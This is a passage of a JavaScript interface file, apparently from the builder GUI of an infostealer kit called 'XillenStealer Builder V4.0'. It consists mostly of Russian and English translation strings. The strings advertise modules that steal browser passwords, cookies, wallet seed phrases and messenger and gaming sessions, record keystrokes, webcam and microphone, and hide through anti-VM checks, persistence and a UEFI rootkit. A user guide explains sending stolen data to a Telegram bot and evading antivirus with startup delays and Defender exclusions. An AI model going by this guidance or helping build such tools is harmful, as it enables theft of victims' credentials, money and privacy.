let currentTheme = 'deep_dark';
let currentLanguage = 'ru';
let isRainEnabled = false;
let rainInterval = null;

// Performance optimizations
let animationFrameId = null;
let lastUpdateTime = 0;
const UPDATE_INTERVAL = 16; // ~60fps

// Debounce function for performance
function debounce(func, wait) {
  let timeout;
  return function executedFunction(...args) {
    const later = () => {
      clearTimeout(timeout);
      func(...args);
    };
    clearTimeout(timeout);
    timeout = setTimeout(later, wait);
  };
}

// Throttle function for performance
function throttle(func, limit) {
  let inThrottle;
  return function() {
    const args = arguments;
    const context = this;
    if (!inThrottle) {
      func.apply(context, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}

// Optimized update function
function optimizedUpdate() {
  const now = performance.now();
  if (now - lastUpdateTime >= UPDATE_INTERVAL) {
    lastUpdateTime = now;
    // Perform updates here
  }
  animationFrameId = requestAnimationFrame(optimizedUpdate);
}

// Debounce function for better performance
function debounce(func, wait) {
  let timeout;
  return function executedFunction(...args) {
    const later = () => {
      clearTimeout(timeout);
      func(...args);
    };
    clearTimeout(timeout);
    timeout = setTimeout(later, wait);
  };
}

const translations = {
  ru: {
    'app.title': 'XillenStealer Builder V4.0',
    'nav.create': 'Создать стиллер',
    'nav.builds': 'Мои сборки',
    'nav.settings': 'Настройки',
    'nav.about': 'О программе',
    'nav.guide': 'Руководство',
    'nav.faq': 'FAQ модулей',
    'topbar.refresh': 'Обновить',
    'topbar.settings': 'Настройки',
    'topbar.exit': 'Выход',
    'create.title': 'Создание стиллера',
    'create.status': 'Статус:',
    'create.status.ready': 'Готов к работе',
    'create.basic': 'Основные настройки',
    'create.name': 'Имя стиллера:',
    'create.icon': 'Иконка EXE:',
    'create.selectIcon': 'Выбрать иконку',
    'create.noFile': 'Нет файла',
    'create.token': 'Токен бота:',
    'create.chat': 'ID чата:',
    'create.sleep': 'Задержка перед запуском (сек):',
    'create.chunk': 'Размер чанка (байт):',
    'create.modules': 'Модули стиллера V4.0',
    'create.create': 'Создать',
    'create.reset': 'Сброс',
    'create.cancel': 'Отмена',
    'create.compile': 'Компилировать в EXE',
    'create.progress.preparing': 'Подготовка...',
    'create.log': 'Журнал сборки:',
    'settings.title': 'Настройки',
    'settings.theme': 'Тема интерфейса',
    'settings.theme.deep': 'Глубокий тёмный',
    'settings.theme.scarlet': 'Алый',
    'settings.theme.light': 'Светлая',
    'settings.other': 'Другие настройки',
    'settings.opacity': 'Прозрачность окна:',
    'settings.rain': 'Эффект дождя:',
    'settings.rain.off': 'Выкл',
    'settings.language': 'Язык:',
    'settings.telegram.lang': 'Язык отчета в Telegram:',
    'settings.telegram.preview': 'Предпросмотр отчета:',
    'settings.on': 'Вкл',
    'settings.off': 'Выкл',
    'about.title': 'О программе',
    'about.info': 'Информация о программе',
    'about.author': 'Главный разработчик:',
    'about.developer': 'Главный разработчик:',
    'about.github': 'GitHub:',
    'about.telegram': 'Telegram:',
    'about.team': 'Команда:',
    'about.version': 'Версия:',
    'about.year': 'Год:',
    'about.features': 'Возможности XillenStealer V4.0',
    'about.feature.cross': 'Кросс-платформенная поддержка',
    'about.feature.data': 'Расширенный сбор данных',
    'about.feature.stealth': 'Стелс-технологии',
    'about.feature.persist': 'Персистентность',
    'about.feature.anti': 'Анти-отладка и анти-VM',
    'about.feature.gpu': 'GPU память и eBPF хуки',
    'about.feature.tpm': 'TPM модуль и UEFI руткит',
    'about.feature.docker': 'Docker и Kubernetes',
    'about.feature.iot': 'IoT сканирование',
    'about.feature.webrtc': 'WebRTC сбор данных',
    'about.modules.title': 'Подробное описание модулей',
    'about.modules.browsers.title': 'Браузеры и пароли (100+ браузеров)',
    'about.modules.browsers.chromium': 'Chromium-браузеры:',
    'about.modules.browsers.firefox': 'Firefox-браузеры:',
    'about.modules.browsers.specialized': 'Специализированные приложения:',
    'about.modules.wallets.title': 'Крипто-кошельки (50+ кошельков)',
    'about.modules.wallets.main': 'Основные кошельки:',
    'about.modules.wallets.exchanges': 'Биржи:',
    'about.modules.wallets.payments': 'Платежные системы:',
    'about.modules.security.title': 'Система и безопасность',
    'about.modules.security.antidebug': 'Анти-отладка:',
    'about.modules.security.antivm': 'Анти-VM:',
    'about.modules.security.screenshot': 'Скриншот экрана:',
    'about.modules.security.keylogger': 'Клавиатурный шпион:',
    'about.modules.security.audio': 'Запись звука:',
    'about.modules.security.webcam': 'Веб-камера:',
    'about.modules.security.antidebug.desc': 'Защищает от отладчиков и анализа в песочнице, детектирует OllyDbg, x64dbg, IDA Pro, Ghidra, WinDbg, Process Hacker, Process Monitor, Wireshark, Fiddler, Burp Suite',
    'about.modules.security.antivm.desc': 'Обнаруживает виртуальные машины (VMware, VirtualBox, Hyper-V, QEMU, Parallels, Xen, KVM) и завершает работу',
    'about.modules.security.screenshot.desc': 'Делает скриншот экрана жертвы в высоком качестве',
    'about.modules.security.keylogger.desc': 'Записывает нажатия клавиш в реальном времени',
    'about.modules.security.audio.desc': 'Записывает звук с микрофона жертвы',
    'about.modules.security.webcam.desc': 'Делает фото с веб-камеры жертвы',
    'about.modules.files.title': 'Файлы и данные',
    'about.modules.files.documents': 'Документы:',
    'about.modules.files.desktop': 'Рабочий стол:',
    'about.modules.files.downloads': 'Загрузки:',
    'about.modules.files.system': 'Системная информация:',
    'about.modules.files.documents.desc': 'Крадет файлы из папки Документы (PDF, DOC, DOCX, XLS, XLSX, PPT, PPTX, TXT, RTF)',
    'about.modules.files.desktop.desc': 'Извлекает файлы с рабочего стола',
    'about.modules.files.downloads.desc': 'Крадет файлы из папки Загрузки',
    'about.modules.files.system.desc': 'Собирает данные о системе, процессоре, памяти, видеокарте, сетевых адаптерах, установленных программах',
    'about.modules.additional.title': 'Дополнительные модули',
    'about.modules.additional.fingerprint': 'Детект браузерных отпечатков:',
    'about.modules.additional.clipboard': 'Мониторинг буфера обмена:',
    'about.modules.additional.filesystem': 'Мониторинг файловой системы:',
    'about.modules.additional.network': 'Анализ сетевого трафика:',
    'about.modules.additional.password': 'Интеграция с менеджерами паролей:',
    'about.modules.additional.social': 'Токены социальных сетей:',
    'about.modules.additional.iot': 'IoT сканер:',
    'about.modules.additional.webrtc': 'WebRTC данные:',
    'about.modules.games.title': 'Игровые лаунчеры',
    'about.modules.games.steam': 'Steam:',
    'about.modules.games.epic': 'Epic Games:',
    'about.modules.games.minecraft': 'Minecraft:',
    'about.modules.games.origin': 'Origin:',
    'about.modules.games.uplay': 'Uplay:',
    'about.modules.games.battlenet': 'Battle.net:',
    'about.modules.technical.title': 'Технические возможности',
    'about.modules.technical.persistence': 'Персистентность:',
    'about.modules.technical.uefi': 'UEFI руткит:',
    'about.modules.technical.inject': 'Инжект в процессы:',
    'about.modules.technical.gpu': 'GPU память:',
    'about.modules.technical.ebpf': 'eBPF хуки:',
    'about.modules.technical.tpm': 'TPM модуль:',
    'about.modules.technical.dma': 'DMA атаки:',
    'about.modules.technical.wifi': 'Wi-Fi C2:',
    'about.modules.technical.proxy': 'Облачный прокси:',
    'about.modules.technical.kubernetes': 'Kubernetes:',
    'about.modules.technical.docker': 'Docker:',
    'about.modules.technical.persistence.desc': 'Автозапуск при загрузке системы, скрытие в системе',
    'about.modules.technical.uefi.desc': 'Загрузка на уровне UEFI для максимальной скрытности',
    'about.modules.technical.inject.desc': 'Внедрение в другие процессы для обхода детекции',
    'about.modules.technical.gpu.desc': 'Использование GPU для обработки данных',
    'about.modules.technical.ebpf.desc': 'Перехват системных вызовов через eBPF',
    'about.modules.technical.tpm.desc': 'Работа с Trusted Platform Module',
    'about.modules.technical.dma.desc': 'Прямой доступ к памяти через DMA',
    'about.modules.technical.wifi.desc': 'Командный канал через Wi-Fi',
    'about.modules.technical.proxy.desc': 'Использование облачных прокси для скрытности',
    'about.modules.technical.kubernetes.desc': 'Работа в Kubernetes кластерах',
    'about.modules.technical.docker.desc': 'Контейнеризация и работа в Docker',
    'guide.title': 'Руководство пользователя',
    'guide.quickstart': 'Быстрый старт',
    'guide.step1.title': 'Получите токен бота',
    'guide.step1.desc': 'Создайте бота в @BotFather и получите токен',
    'guide.step2.title': 'Узнайте Chat ID',
    'guide.step2.desc': 'Напишите боту @userinfobot для получения вашего ID',
    'guide.step3.title': 'Настройте стиллер',
    'guide.step3.desc': 'Введите токен, Chat ID и выберите нужные модули',
    'guide.step4.title': 'Создайте и скомпилируйте',
    'guide.step4.desc': 'Нажмите "Создать" и выберите компиляцию в EXE',
    'guide.modules': 'Настройки модулей',
    'guide.browsers': 'Браузеры',
    'guide.wallets': 'Крипто-кошельки',
    'guide.system': 'Системная информация',
    'guide.screenshot': 'Скриншот экрана',
    'guide.audio': 'Запись звука',
    'guide.keylogger': 'Логи клавиатуры',
    'guide.anti': 'Анти-защита',
    'guide.persistence': 'Персистентность',
    'guide.advanced': 'Продвинутые модули',
    'guide.tips': 'Полезные советы',
    'guide.tip1': 'Используйте задержку запуска для обхода антивирусов',
    'guide.tip2': 'Настройте размер чанка в зависимости от скорости интернета',
    'guide.tip3': 'Включите только необходимые модули для снижения размера',
    'guide.tip4': 'Регулярно обновляйте токен бота для безопасности',
    'guide.modules.title': 'Настройки модулей',
    'guide.basic.modules': 'Основные модули',
    'guide.advanced.modules': 'Продвинутые модули',
    'guide.stealth.modules': 'Стелс модули',
    'guide.tips.title': 'Советы и рекомендации',
    'guide.security.title': 'Безопасность',
    'guide.security.desc': 'Используйте VPN и прокси для анонимности. Не запускайте на своем основном ПК.',
    'guide.performance.title': 'Производительность',
    'guide.performance.desc': 'Отключите ненужные модули для уменьшения размера файла и повышения скорости.',
    'guide.customization.title': 'Кастомизация',
    'guide.customization.desc': 'Измените имя файла и настройки задержки для уникальности каждого стиллера.',
    'guide.monitoring.title': 'Мониторинг',
    'guide.monitoring.desc': 'Следите за логами в Telegram для отслеживания активности стиллера.',
    'guide.faq.title': 'Часто задаваемые вопросы',
    'guide.faq.q1': 'Стиллер не запускается на Windows Defender?',
    'guide.faq.a1': 'Добавьте исключение в антивирус или используйте модуль "Анти-отладка".',
    'guide.faq.q2': 'Как уменьшить размер EXE файла?',
    'guide.faq.a2': 'Отключите ненужные модули и используйте UPX сжатие в PyInstaller.',
    'guide.faq.q3': 'Стиллер не отправляет данные в Telegram?',
    'guide.faq.a3': 'Проверьте правильность токена бота и Chat ID. Убедитесь в наличии интернета.',
    'guide.faq.q4': 'Можно ли использовать на Linux/Mac?',
    'guide.faq.a4': 'Да, но некоторые модули работают только на Windows. Проверьте совместимость.',
    'guide.module.browsers.desc': 'Сбор браузеров - пароли, куки, история',
    'guide.module.wallets.desc': 'Крипто-кошельки - Bitcoin, Ethereum, другие',
    'guide.module.system.desc': 'Системная информация - ОС, железо, сеть',
    'guide.module.screenshot.desc': 'Скриншот экрана - захват рабочего стола',
    'guide.module.audio.desc': 'Запись звука - микрофон, системные звуки',
    'guide.module.keylogger.desc': 'Логи клавиатуры - кейлоггер',
    'guide.module.anti_debug.desc': 'Анти-отладка - защита от анализа',
    'guide.module.anti_vm.desc': 'Анти-VM - детект виртуальных машин',
    'guide.module.persistence.desc': 'Персистентность - автозапуск',
    'guide.module.uefi.desc': 'UEFI руткит - загрузочный уровень',
    'guide.module.process_inject.desc': 'Инжект в процессы - скрытое выполнение',
    'guide.module.gpu.desc': 'GPU память - анализ видеокарты',
    'builds.title': 'Мои сборки',
    'builds.empty': 'Сборки не найдены',
    'builds.create': 'Создайте первую сборку',
    'builds.total': 'Всего сборок',
    'builds.python': 'Python файлы',
    'builds.exe': 'EXE файлы',
    'builds.open': 'Открыть папку builds',
    'builds.refresh': 'Обновить',
    'faq.title': 'FAQ модулей XillenStealer V4.0',
    'faq.search': 'Поиск модулей...',
    'faq.noresults': 'Модули не найдены',
    'faq.tryagain': 'Попробуйте изменить поисковый запрос',
    'faq.category.browsers': 'Браузеры и пароли',
    'faq.category.crypto': 'Криптовалюты и кошельки',
    'faq.category.messengers': 'Мессенджеры и соцсети',
    'faq.category.system': 'Система и безопасность',
    'faq.category.files': 'Файлы и данные',
    'faq.module.chrome': 'Chrome',
    'faq.module.chrome.desc': 'Крадет сохраненные пароли, куки и данные автозаполнения из Google Chrome',
    'faq.module.firefox': 'Firefox',
    'faq.module.firefox.desc': 'Извлекает пароли и куки из Mozilla Firefox',
    'faq.module.edge': 'Edge',
    'faq.module.edge.desc': 'Крадет данные из Microsoft Edge браузера',
    'faq.module.opera': 'Opera',
    'faq.module.opera.desc': 'Извлекает пароли и куки из Opera браузера',
    'faq.module.brave': 'Brave',
    'faq.module.brave.desc': 'Крадет данные из Brave браузера',
    'faq.module.exodus': 'Exodus',
    'faq.module.exodus.desc': 'Крадет seed фразы и приватные ключи из кошелька Exodus',
    'faq.module.electrum': 'Electrum',
    'faq.module.electrum.desc': 'Извлекает данные из Bitcoin кошелька Electrum',
    'faq.module.atomic': 'Atomic',
    'faq.module.atomic.desc': 'Крадет данные из Atomic Wallet',
    'faq.module.coinbase': 'Coinbase',
    'faq.module.coinbase.desc': 'Извлекает данные из Coinbase кошелька',
    'faq.module.discord': 'Discord',
    'faq.module.discord.desc': 'Крадет токены Discord и данные аккаунта',
    'faq.module.telegram': 'Telegram',
    'faq.module.telegram.desc': 'Извлекает сессии Telegram Desktop',
    'faq.module.steam': 'Steam',
    'faq.module.steam.desc': 'Крадет Steam сессии и данные аккаунта',
    'faq.module.anti_debug.desc': 'Защищает от отладчиков и анализа в песочнице',
    'faq.module.anti_vm.desc': 'Обнаруживает виртуальные машины и завершает работу',
    'faq.module.screenshot.desc': 'Делает скриншот экрана жертвы',
    'faq.module.keylogger.desc': 'Записывает нажатия клавиш',
    'faq.module.audio.desc': 'Записывает звук с микрофона',
    'faq.module.webcam.desc': 'Делает фото с веб-камеры',
    'faq.module.documents.desc': 'Крадет файлы из папки Документы',
    'faq.module.desktop.desc': 'Извлекает файлы с рабочего стола',
    'faq.module.downloads.desc': 'Крадет файлы из папки Загрузки',
    'faq.module.system_info.desc': 'Собирает данные о системе, процессоре, памяти',
    'faq.module.documents': 'Документы',
    'faq.module.desktop': 'Рабочий стол',
    'faq.module.downloads': 'Загрузки',
    'faq.module.webcam': 'Веб-камера',
    'module.browsers': 'Сбор браузеров',
    'module.wallets': 'Крипто-кошельки',
    'module.system_info': 'Системная информация',
    'module.screenshot': 'Скриншот экрана',
    'module.audio_record': 'Запись звука',
    'module.keylogger': 'Логи клавиатуры',
    'module.anti_debug': 'Анти-отладка',
    'module.anti_vm': 'Анти-VM',
    'module.persistence': 'Персистентность',
    'module.uefi': 'UEFI руткит',
    'module.process_inject': 'Инжект в процессы',
    'module.gpu_memory': 'GPU память',
    'module.ebpf': 'eBPF хуки',
    'module.tpm': 'TPM модуль',
    'module.dma': 'DMA атаки',
    'module.wifi_c2': 'Wi-Fi C2',
    'module.cloud_proxy': 'Облачный прокси',
    'module.kubernetes': 'Kubernetes',
    'module.docker': 'Docker',
    'module.iot': 'IoT сканер',
    'module.totp': 'Сбор TOTP',
    'module.biometric': 'Биометрические данные',
    'module.webrtc': 'WebRTC данные',
    'module.payment': 'Платежные системы',
    'module.browser_fingerprint': 'Отпечатки браузера',
    'module.clipboard_monitor': 'Мониторинг буфера',
    'module.file_watcher': 'Мониторинг файлов',
    'module.network_analyzer': 'Анализ трафика',
    'module.password_managers': 'Менеджеры паролей',
    'module.social_tokens': 'Соцсети токены',
    'module.linpeas': 'LinPEAS сканер',
    'module.enabled': 'Включен',
    'module.disabled': 'Выключен',
    'module.select_all': 'Выбрать всё',
    'module.deselect_all': 'Отменить всё',
    'info.sleep.title': 'Задержка запуска',
    'info.sleep.desc': 'Время ожидания перед началом работы стиллера. Помогает избежать обнаружения антивирусом при запуске.',
    'info.chunk.title': 'Размер чанка',
    'info.chunk.desc': 'Размер блока данных для отправки в Telegram. Больший размер = быстрее передача, но больше нагрузка на сеть.',
    'auth.title': 'XillenStealer Builder',
    'auth.version': 'v4.0',
    'auth.login': 'Аутентификация',
    'auth.password': 'Введите пароль для доступа',
    'auth.password.placeholder': 'Пароль',
    'auth.login.btn': 'Войти',
    'auth.language': 'Язык:',
    'progress.analysis': 'Анализ',
    'progress.build': 'Сборка',
    'progress.optimize': 'Оптимизация',
    'progress.complete': 'Завершение',
    'auth.footer': 'Разработано командой XillenKillers | @XillenAdapter | @BengaminButton',
    'auth.password.info': 'Пароль указан в репозитории GitHub'
  },
  en: {
    'app.title': 'XillenStealer Builder V4.0',
    'nav.create': 'Create Stealer',
    'nav.builds': 'My Builds',
    'nav.settings': 'Settings',
    'nav.about': 'About',
    'nav.guide': 'Guide',
    'nav.faq': 'Modules FAQ',
    'topbar.refresh': 'Refresh',
    'topbar.settings': 'Settings',
    'topbar.exit': 'Exit',
    'create.title': 'Create Stealer',
    'create.status': 'Status:',
    'create.status.ready': 'Ready to work',
    'create.basic': 'Basic Settings',
    'create.name': 'Stealer Name:',
    'create.icon': 'EXE Icon:',
    'create.selectIcon': 'Select Icon',
    'create.noFile': 'No file',
    'create.token': 'Bot Token:',
    'create.chat': 'Chat ID:',
    'create.sleep': 'Startup Delay (sec):',
    'create.chunk': 'Chunk Size (bytes):',
    'create.modules': 'Stealer Modules V4.0',
    'create.create': 'Create',
    'create.reset': 'Reset',
    'create.cancel': 'Cancel',
    'create.compile': 'Compile to EXE',
    'create.progress.preparing': 'Preparing...',
    'create.log': 'Build Log:',
    'settings.title': 'Settings',
    'settings.theme': 'Interface Theme',
    'settings.theme.deep': 'Deep Dark',
    'settings.theme.scarlet': 'Scarlet',
    'settings.theme.light': 'Light',
    'settings.other': 'Other Settings',
    'settings.opacity': 'Window Transparency:',
    'settings.rain': 'Rain Effect:',
    'settings.rain.off': 'Off',
    'settings.language': 'Language:',
    'settings.telegram.lang': 'Telegram Report Language:',
    'settings.telegram.preview': 'Report Preview:',
    'settings.on': 'On',
    'settings.off': 'Off',
    'about.title': 'About',
    'about.info': 'Program Information',
    'about.author': 'Main Developer:',
    'about.developer': 'Main Developer:',
    'about.github': 'GitHub:',
    'about.telegram': 'Telegram:',
    'about.team': 'Team:',
    'about.version': 'Version:',
    'about.year': 'Year:',
    'about.features': 'XillenStealer V4.0 Features',
    'about.feature.cross': 'Cross-platform Support',
    'about.feature.data': 'Advanced Data Collection',
    'about.feature.stealth': 'Stealth Technologies',
    'about.feature.persist': 'Persistence',
    'about.feature.anti': 'Anti-debug and Anti-VM',
    'about.feature.gpu': 'GPU Memory and eBPF Hooks',
    'about.feature.tpm': 'TPM Module and UEFI Rootkit',
    'about.feature.docker': 'Docker and Kubernetes',
    'about.feature.iot': 'IoT Scanning',
    'about.feature.webrtc': 'WebRTC Data Collection',
    'about.modules.title': 'Detailed Module Description',
    'about.modules.browsers.title': 'Browsers and Passwords (100+ browsers)',
    'about.modules.browsers.chromium': 'Chromium-based browsers:',
    'about.modules.browsers.firefox': 'Firefox-based browsers:',
    'about.modules.browsers.specialized': 'Specialized applications:',
    'about.modules.wallets.title': 'Cryptocurrency Wallets (50+ wallets)',
    'about.modules.wallets.main': 'Main wallets:',
    'about.modules.wallets.exchanges': 'Exchanges:',
    'about.modules.wallets.payments': 'Payment systems:',
    'about.modules.security.title': 'System and Security',
    'about.modules.security.antidebug': 'Anti-debug:',
    'about.modules.security.antivm': 'Anti-VM:',
    'about.modules.security.screenshot': 'Screenshot:',
    'about.modules.security.keylogger': 'Keylogger:',
    'about.modules.security.audio': 'Audio recording:',
    'about.modules.security.webcam': 'Webcam:',
    'about.modules.security.antidebug.desc': 'Protects against debuggers and sandbox analysis, detects OllyDbg, x64dbg, IDA Pro, Ghidra, WinDbg, Process Hacker, Process Monitor, Wireshark, Fiddler, Burp Suite',
    'about.modules.security.antivm.desc': 'Detects virtual machines (VMware, VirtualBox, Hyper-V, QEMU, Parallels, Xen, KVM) and terminates execution',
    'about.modules.security.screenshot.desc': 'Takes high-quality screenshot of victim\'s screen',
    'about.modules.security.keylogger.desc': 'Records keystrokes in real-time',
    'about.modules.security.audio.desc': 'Records audio from victim\'s microphone',
    'about.modules.security.webcam.desc': 'Takes photo from victim\'s webcam',
    'about.modules.files.title': 'Files and Data',
    'about.modules.files.documents': 'Documents:',
    'about.modules.files.desktop': 'Desktop:',
    'about.modules.files.downloads': 'Downloads:',
    'about.modules.files.system': 'System information:',
    'about.modules.files.documents.desc': 'Steals files from Documents folder (PDF, DOC, DOCX, XLS, XLSX, PPT, PPTX, TXT, RTF)',
    'about.modules.files.desktop.desc': 'Extracts files from desktop',
    'about.modules.files.downloads.desc': 'Steals files from Downloads folder',
    'about.modules.files.system.desc': 'Collects system data, CPU, memory, graphics card, network adapters, installed programs',
    'about.modules.additional.title': 'Additional Modules',
    'about.modules.additional.fingerprint': 'Browser Fingerprinting:',
    'about.modules.additional.clipboard': 'Clipboard Monitoring:',
    'about.modules.additional.filesystem': 'File System Monitoring:',
    'about.modules.additional.network': 'Network Traffic Analysis:',
    'about.modules.additional.password': 'Password Manager Integration:',
    'about.modules.additional.social': 'Social Media Tokens:',
    'about.modules.additional.iot': 'IoT Scanner:',
    'about.modules.additional.webrtc': 'WebRTC Data:',
    'about.modules.games.title': 'Game Launchers',
    'about.modules.games.steam': 'Steam:',
    'about.modules.games.epic': 'Epic Games:',
    'about.modules.games.minecraft': 'Minecraft:',
    'about.modules.games.origin': 'Origin:',
    'about.modules.games.uplay': 'Uplay:',
    'about.modules.games.battlenet': 'Battle.net:',
    'about.modules.technical.title': 'Technical Capabilities',
    'about.modules.technical.persistence': 'Persistence:',
    'about.modules.technical.uefi': 'UEFI Rootkit:',
    'about.modules.technical.inject': 'Process Injection:',
    'about.modules.technical.gpu': 'GPU Memory:',
    'about.modules.technical.ebpf': 'eBPF Hooks:',
    'about.modules.technical.tpm': 'TPM Module:',
    'about.modules.technical.dma': 'DMA Attacks:',
    'about.modules.technical.wifi': 'Wi-Fi C2:',
    'about.modules.technical.proxy': 'Cloud Proxy:',
    'about.modules.technical.kubernetes': 'Kubernetes:',
    'about.modules.technical.docker': 'Docker:',
    'guide.title': 'User Guide',
    'guide.quickstart': 'Quick Start',
    'guide.step1.title': 'Get Bot Token',
    'guide.step1.desc': 'Create a bot in @BotFather and get the token',
    'guide.step2.title': 'Get Chat ID',
    'guide.step2.desc': 'Message @userinfobot to get your ID',
    'guide.step3.title': 'Configure Stealer',
    'guide.step3.desc': 'Enter token, Chat ID and select needed modules',
    'guide.step4.title': 'Create and Compile',
    'guide.step4.desc': 'Click "Create" and choose EXE compilation',
    'guide.modules': 'Module Settings',
    'guide.browsers': 'Browsers',
    'guide.wallets': 'Crypto Wallets',
    'guide.system': 'System Information',
    'guide.screenshot': 'Screenshot',
    'guide.audio': 'Audio Recording',
    'guide.keylogger': 'Keylogger',
    'guide.anti': 'Anti-Protection',
    'guide.persistence': 'Persistence',
    'guide.advanced': 'Advanced Modules',
    'guide.tips': 'Useful Tips',
    'guide.tip1': 'Use startup delay to bypass antiviruses',
    'guide.tip2': 'Configure chunk size based on internet speed',
    'guide.tip3': 'Enable only necessary modules to reduce size',
    'guide.tip4': 'Regularly update bot token for security',
    'guide.modules.title': 'Module Settings',
    'guide.basic.modules': 'Basic Modules',
    'guide.advanced.modules': 'Advanced Modules',
    'guide.stealth.modules': 'Stealth Modules',
    'guide.tips.title': 'Tips and Recommendations',
    'guide.security.title': 'Security',
    'guide.security.desc': 'Use VPN and proxies for anonymity. Do not run on your main PC.',
    'guide.performance.title': 'Performance',
    'guide.performance.desc': 'Disable unnecessary modules to reduce file size and increase speed.',
    'guide.customization.title': 'Customization',
    'guide.customization.desc': 'Change file name and delay settings for uniqueness of each stealer.',
    'guide.monitoring.title': 'Monitoring',
    'guide.monitoring.desc': 'Monitor logs in Telegram to track stealer activity.',
    'guide.faq.title': 'Frequently Asked Questions',
    'guide.faq.q1': 'Stealer not starting on Windows Defender?',
    'guide.faq.a1': 'Add exception to antivirus or use "Anti-debug" module.',
    'guide.faq.q2': 'How to reduce EXE file size?',
    'guide.faq.a2': 'Disable unnecessary modules and use UPX compression in PyInstaller.',
    'guide.faq.q3': 'Stealer not sending data to Telegram?',
    'guide.faq.a3': 'Check bot token and Chat ID correctness. Ensure internet connection.',
    'guide.faq.q4': 'Can it be used on Linux/Mac?',
    'guide.faq.a4': 'Yes, but some modules work only on Windows. Check compatibility.',
    'guide.module.browsers.desc': 'Browser Collection - passwords, cookies, history',
    'guide.module.wallets.desc': 'Crypto Wallets - Bitcoin, Ethereum, others',
    'guide.module.system.desc': 'System Information - OS, hardware, network',
    'guide.module.screenshot.desc': 'Screenshot - desktop capture',
    'guide.module.audio.desc': 'Audio Recording - microphone, system sounds',
    'guide.module.keylogger.desc': 'Keylogger - keystroke recording',
    'guide.module.anti_debug.desc': 'Anti-Debug - protection from analysis',
    'guide.module.anti_vm.desc': 'Anti-VM - virtual machine detection',
    'guide.module.persistence.desc': 'Persistence - autorun',
    'guide.module.uefi.desc': 'UEFI Rootkit - boot level',
    'guide.module.process_inject.desc': 'Process Injection - hidden execution',
    'guide.module.gpu.desc': 'GPU Memory - graphics card analysis',
    'builds.title': 'My Builds',
    'builds.empty': 'No builds found',
    'builds.create': 'Create first build',
    'builds.total': 'Total Builds',
    'builds.python': 'Python Files',
    'builds.exe': 'EXE Files',
    'builds.open': 'Open builds folder',
    'builds.refresh': 'Refresh',
    'faq.title': 'XillenStealer V4.0 Modules FAQ',
    'faq.search': 'Search modules...',
    'faq.noresults': 'Modules not found',
    'faq.tryagain': 'Try changing search query',
    'faq.category.browsers': 'Browsers and Passwords',
    'faq.category.crypto': 'Cryptocurrencies and Wallets',
    'faq.category.messengers': 'Messengers and Social Media',
    'faq.category.system': 'System and Security',
    'faq.category.files': 'Files and Data',
    'faq.module.chrome': 'Chrome',
    'faq.module.chrome.desc': 'Steals saved passwords, cookies and autofill data from Google Chrome',
    'faq.module.firefox': 'Firefox',
    'faq.module.firefox.desc': 'Extracts passwords and cookies from Mozilla Firefox',
    'faq.module.edge': 'Edge',
    'faq.module.edge.desc': 'Steals data from Microsoft Edge browser',
    'faq.module.opera': 'Opera',
    'faq.module.opera.desc': 'Extracts passwords and cookies from Opera browser',
    'faq.module.brave': 'Brave',
    'faq.module.brave.desc': 'Steals data from Brave browser',
    'faq.module.exodus': 'Exodus',
    'faq.module.exodus.desc': 'Steals seed phrases and private keys from Exodus wallet',
    'faq.module.electrum': 'Electrum',
    'faq.module.electrum.desc': 'Extracts data from Bitcoin Electrum wallet',
    'faq.module.atomic': 'Atomic',
    'faq.module.atomic.desc': 'Steals data from Atomic Wallet',
    'faq.module.coinbase': 'Coinbase',
    'faq.module.coinbase.desc': 'Extracts data from Coinbase wallet',
    'faq.module.discord': 'Discord',
    'faq.module.discord.desc': 'Steals Discord tokens and account data',
    'faq.module.telegram': 'Telegram',
    'faq.module.telegram.desc': 'Extracts Telegram Desktop sessions',
    'faq.module.steam': 'Steam',
    'faq.module.steam.desc': 'Steals Steam sessions and account data',
    'faq.module.anti_debug.desc': 'Protects from debuggers and sandbox analysis',
    'faq.module.anti_vm.desc': 'Detects virtual machines and terminates execution',
    'faq.module.screenshot.desc': 'Takes screenshot of victim\'s screen',
    'faq.module.keylogger.desc': 'Records keystrokes',
    'faq.module.audio.desc': 'Records sound from microphone',
    'faq.module.webcam.desc': 'Takes photo from webcam',
    'faq.module.documents.desc': 'Steals files from Documents folder',
    'faq.module.desktop.desc': 'Extracts files from desktop',
    'faq.module.downloads.desc': 'Steals files from Downloads folder',
    'faq.module.system_info.desc': 'Collects system, processor, memory data',
    'faq.module.documents': 'Documents',
    'faq.module.desktop': 'Desktop',
    'faq.module.downloads': 'Downloads',
    'faq.module.webcam': 'Webcam',
    'module.browsers': 'Browser Collection',
    'module.wallets': 'Crypto Wallets',
    'module.system_info': 'System Information',
    'module.screenshot': 'Screenshot',
    'module.audio_record': 'Audio Recording',
    'module.keylogger': 'Keylogger',
    'module.anti_debug': 'Anti-Debug',
    'module.anti_vm': 'Anti-VM',
    'module.persistence': 'Persistence',
    'module.uefi': 'UEFI Rootkit',
    'module.process_inject': 'Process Injection',
    'module.gpu_memory': 'GPU Memory',
    'module.ebpf': 'eBPF Hooks',
    'module.tpm': 'TPM Module',
    'module.dma': 'DMA Attacks',
    'module.wifi_c2': 'Wi-Fi C2',
    'module.cloud_proxy': 'Cloud Proxy',
    'module.kubernetes': 'Kubernetes',
    'module.docker': 'Docker',
    'module.iot': 'IoT Scanner',
    'module.totp': 'TOTP Collection',
    'module.biometric': 'Biometric Data',
    'module.webrtc': 'WebRTC Data',
    'module.payment': 'Payment Systems',
    'module.browser_fingerprint': 'Browser Fingerprinting',
    'module.clipboard_monitor': 'Clipboard Monitoring',
    'module.file_watcher': 'File System Watcher',
    'module.network_analyzer': 'Network Traffic Analysis',
    'module.password_managers': 'Password Managers',
    'module.social_tokens': 'Social Media Tokens',
    'module.linpeas': 'LinPEAS Scanner',
    'module.enabled': 'Enabled',
    'module.disabled': 'Disabled',
    'module.select_all': 'Select All',
    'module.deselect_all': 'Deselect All',
    'info.sleep.title': 'Startup Delay',
    'info.sleep.desc': 'Wait time before stealer starts working. Helps avoid antivirus detection on startup.',
    'info.chunk.title': 'Chunk Size',
    'info.chunk.desc': 'Data block size for sending to Telegram. Larger size = faster transfer, but more network load.',
    'auth.title': 'XillenStealer Builder',
    'auth.version': 'v4.0',
    'auth.login': 'Authentication',
    'auth.password': 'Enter password for access',
    'auth.password.placeholder': 'Password',
    'auth.login.btn': 'Login',
    'auth.language': 'Language:',
    'progress.analysis': 'Analysis',
    'progress.build': 'Building',
    'progress.optimize': 'Optimization',
    'progress.complete': 'Completion',
    'auth.footer': 'Developed by XillenKillers team | @XillenAdapter | @BengaminButton',
    'auth.password.info': 'Password is specified in GitHub repository',
